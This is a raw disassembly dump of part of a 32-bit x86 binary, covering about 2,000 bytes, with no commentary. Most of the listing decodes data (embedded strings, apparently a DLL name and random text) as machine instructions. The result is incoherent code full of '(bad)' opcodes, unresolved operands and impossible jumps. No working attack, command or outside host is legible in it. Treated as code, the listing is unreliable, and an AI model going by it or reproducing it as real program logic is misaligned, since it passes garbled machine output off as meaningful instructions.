  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    ebp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [eax+edx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fsub   DWORD PTR [eax]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fldcw  WORD PTR [ecx-0x4e]
  414e42:	ficomp WORD PTR [esi+0xe58c]
  414e48:	cmc    
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    dh,bh
  414e4d:	xor    al,0x33
  414e4f:	rep lods al,BYTE PTR ds:[esi]
  414e51:	xchg   ebx,eax
  414e52:	in     eax,dx
  414e53:	aas    
  414e54:	stc    
  414e55:	mov    esp,0x87987832
  414e5a:	xchg   esp,eax
  414e5b:	imul   ebp,ebx,0x68
  414e5e:	fisttp QWORD PTR [eax+eax*4]
  414e61:	cdq    
  414e62:	mov    ebx,0x27a8fca5
  414e67:	xor    DWORD PTR [edx],ecx
  414e69:	add    eax,0x1722d04c
  414e6e:	outs   dx,DWORD PTR ds:[esi]
  414e6f:	cmp    BYTE PTR [ebp-0x34],dh
  414e72:	mov    ebp,0x45792d52
  414e77:	jae    0x414e59
  414e79:	jp     0x414ea0
  414e7b:	int3   
  414e7c:	mov    eax,0xad7667ce
  414e81:	fstp   QWORD PTR [ebp+0x21]
  414e84:	push   eax
  414e85:	sti    
  414e86:	mov    ds:0x62c0d54f,al
  414e8b:	jecxz  0x414edb
  414e8d:	adc    eax,0x9750b87f
  414e92:	rcl    BYTE PTR [ebx],1
  414e94:	shl    bl,cl
  414e96:	pop    ds
  414e97:	push   0x94a15f92
  414e9c:	aaa    
  414e9d:	jo     0x414eed
  414e9f:	dec    eax
  414ea0:	rcr    DWORD PTR [ecx+edi*1],cl
  414ea3:	out    dx,eax
  414ea4:	cmp    cl,BYTE PTR [edx]
  414ea6:	push   ebp
  414ea7:	and    ch,BYTE PTR [eax]
  414ea9:	pop    eax
  414eaa:	add    dh,BYTE PTR [esp+esi*2+0x29]
  414eae:	stos   BYTE PTR es:[edi],al
  414eaf:	xchg   DWORD PTR [ebp-0xd],ebx
  414eb2:	push   edx
  414eb3:	inc    esi
  414eb4:	add    ah,al
  414eb6:	lahf   
  414eb7:	sub    DWORD PTR [esi+edx*1],esp
  414eba:	jmp    0x414e4a
  414ebc:	ret    
  414ebd:	fadd   DWORD PTR [eax+0x71]
  414ec0:	push   0xa3ccce50
  414ec5:	add    DWORD PTR ds:0xbf1f526,0x9
  414ecc:	adc    bl,BYTE PTR [esi+0x3]
  414ecf:	dec    esp
  414ed0:	push   es
  414ed1:	or     DWORD PTR [ebp-0x11b353d0],edi
  414ed7:	cli    
  414ed8:	mov    dl,ah
  414eda:	lock add cl,BYTE PTR [esi]
  414edd:	and    edi,DWORD PTR [ecx-0x33bb033b]
  414ee3:	and    BYTE PTR [ebp-0x585f2156],dh
  414ee9:	mov    ?,WORD PTR [ebp+0x22]
  414eec:	mov    ecx,0xfb5ed2b9
  414ef1:	stc    
  414ef2:	icebp  
  414ef3:	push   eax
  414ef4:	popf   
  414ef5:	mov    ah,BYTE PTR [ebp+0x5aeb680d]
  414efb:	(bad)  
  414efc:	in     eax,0xda
  414efe:	dec    esi
  414eff:	and    eax,0x70738427
  414f04:	lea    esp,[eax]
  414f06:	dec    ebx
  414f07:	and    BYTE PTR [esi],ch
  414f09:	mov    ecx,0x309fb1f4
  414f0e:	jg     0x414edf
  414f10:	fcom   DWORD PTR [eax+0x4b]
  414f13:	call   0xeeba:0xfcfd4fd8
  414f1a:	out    0xdc,eax
  414f1c:	clc    
  414f1d:	inc    edi
  414f1e:	mov    eax,0x2098c29c
  414f23:	push   es
  414f24:	mov    ebx,0x44f2a544
  414f29:	mov    edi,0xa16dadcd
  414f2e:	add    eax,0xccf854b0
  414f33:	or     DWORD PTR [edx],edi
  414f35:	and    dl,BYTE PTR [ecx+0x63]
  414f38:	not    DWORD PTR es:[ebp-0x32624000]
  414f3f:	cwde   
  414f40:	dec    esi
	...
  414fb1:	add    BYTE PTR [eax],al
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x8dfc
  414fc2:	xor    DWORD PTR [edx],edi
  414fc4:	and    esi,0xf50000
  414fca:	add    BYTE PTR [eax],al
  414fcc:	xchg   dl,dl
  414fce:	fistp  QWORD PTR [edi+0x7510b796]
  414fd4:	fbld   TBYTE PTR [ebx-0x78bcbacf]
  414fda:	mov    esp,0x36f25bd5
  414fdf:	arpl   WORD PTR [eax],ax
  414fe1:	mov    al,0x9b
  414fe3:	or     ecx,DWORD PTR [esi*1-0x416648f3]
  414fea:	aam    0xa4
  414fec:	das    
  414fed:	cmc    
  414fee:	outs   dx,DWORD PTR ds:[esi]
  414fef:	in     al,0xb1
  414ff1:	inc    esi
  414ff2:	mov    ch,0xbf
  414ff4:	adc    DWORD PTR ds:0x8f773712,esp
  414ffa:	jmp    0xd346eecb
  414fff:	outs   dx,DWORD PTR ds:[esi]
  415000:	cmc    
  415001:	stos   BYTE PTR es:[edi],al
  415002:	(bad)  
  415003:	in     eax,0xe
  415005:	test   al,0xfa
  415008:	lods   eax,DWORD PTR ds:[esi]
  415009:	dec    ecx
  41500a:	inc    ebx
  41500b:	retf   
  41500c:	jae    0x415009
  41500e:	mov    edi,0xc0b230c1
  415013:	pop    edi
  415014:	pop    esi
  415015:	in     al,dx
  415016:	jb     0x414faa
  415018:	pop    esp
  415019:	cmp    BYTE PTR ds:0xcfbd391c,cl
  41501f:	push   edx
  415020:	fiadd  DWORD PTR [ebp-0x6626d1fd]
  415026:	addr16 test eax,0x4a16ecfa
  41502c:	imul   esi,DWORD PTR [ecx-0x79],0xffffff95
  415030:	xor    al,0x66
  415032:	out    dx,eax
  415033:	mov    ch,0x71
  415035:	xchg   esi,eax
  415036:	cli    
  415037:	xchg   esi,eax
  415038:	xor    esp,DWORD PTR ds:0x3c049342
  41503e:	and    eax,0xf3ae7ff1
  415043:	gs add al,0xad
  415046:	fwait
  415047:	cmp    eax,edi
  415049:	lods   al,BYTE PTR ds:[esi]
  41504a:	popf   
  41504b:	or     edi,edx
  41504d:	sbb    DWORD PTR [ecx+0x394723b1],edi
  415053:	jmp    0x41504f
  415055:	icebp  
  415056:	ja     0x4150c0
  415058:	add    DWORD PTR [ebx+edi*8+0x29],ebp
  41505c:	rcr    DWORD PTR [ebx-0x7c],cl
  41505f:	imul   edx,DWORD PTR [ebx+0x11f8aa9d],0x84cb0cd5
  415069:	out    0xdf,al
  41506b:	aam    0x9a
  41506d:	bound  edx,QWORD PTR [edx]
  41506f:	cld    
  415070:	stos   BYTE PTR es:[edi],al
  415071:	fild   DWORD PTR [edi+0x313b77f4]
  415077:	pop    esp
  415078:	or     BYTE PTR [edi+esi*2+0x58f0fbeb],cl
  41507f:	out    dx,eax
  415080:	(bad)  
  415081:	or     BYTE PTR [ecx+0x1e0636eb],cl
  415087:	ins    DWORD PTR es:[edi],dx
  415088:	pop    edi
  415089:	loop   0x4150fd
  41508b:	sbb    DWORD PTR [edi+0x77788b52],edx
  415091:	add    ecx,DWORD PTR [edx-0x38c0c9ab]
  415097:	jmp    0xf44b6a28
  41509c:	jbe    0x4150c1
  41509e:	cmp    eax,0x9b9d229c
  4150a3:	mov    ds:0xc8daace1,al
  4150a8:	cmp    al,0xf2
  4150aa:	cmp    al,0x8e
  4150ac:	mov    ds:0x350e4ec2,al
  4150b1:	out    0x64,al
  4150b3:	cmp    al,0x7f
  4150b5:	mov    eax,ds:0xd2b329f6
  4150ba:	add    DWORD PTR [edx+0x6af4ee3c],esp
  4150c0:	fiadd  WORD PTR [eax]
	...
  415132:	add    BYTE PTR [eax],al
  415134:	add    dl,BYTE PTR [edx]
  415136:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41513c:	adc    ah,BYTE PTR [esi-0x31183b27]
  415142:	cmp    edi,DWORD PTR [ebp+0x76]
  415145:	out    0x0,eax
  415147:	add    ch,dh
  415149:	add    BYTE PTR [eax],al
  41514b:	add    BYTE PTR [esi+eiz*2+0x4a6836fb],al
  415152:	jns    0x415175
  415154:	hlt    
  415155:	pop    edx
  415156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415157:	sub    eax,0x84f60e26
  41515c:	fldenv [esi-0x10adc449]
  415162:	inc    esp
  415163:	data16 scas al,BYTE PTR es:[edi]
  415165:	ja     0x415136
  415167:	stos   BYTE PTR es:[edi],al
  415168:	inc    ebp
  415169:	je     0x415107
  41516b:	dec    esp
  41516c:	mov    BYTE PTR [edx-0x973d280],ch
  415172:	mov    eax,0xbde68479
  415177:	xchg   BYTE PTR [edi+ecx*8-0x38],dl
  41517b:	scas   eax,DWORD PTR es:[edi]
  41517c:	pusha  
  41517d:	mov    eax,0x9bc55c0d
  415182:	mov    DWORD PTR [ecx-0x2b],edi
  415185:	adc    BYTE PTR [ecx+0x34],0x88
  415189:	cmp    edx,DWORD PTR [edx-0x7e]
  41518c:	jp     0x415161
  41518e:	aam    0x17
  415190:	add    al,0xf7
  415192:	mov    ds:0x2ed0c21d,al
  415197:	mov    ecx,0xc26f9e60
  41519c:	mov    ecx,0x8bd8378f
  4151a1:	push   ds
  4151a2:	xor    al,BYTE PTR [ebp+0x425c9961]
  4151a8:	test   eax,0xde37e586
  4151ad:	cli    
  4151ae:	nop
  4151af:	inc    esp
  4151b0:	cld    
  4151b1:	xor    cl,BYTE PTR [esi-0x3485d4e1]
  4151b7:	test   BYTE PTR [ebx+0x0],bl
  4151ba:	push   ebx
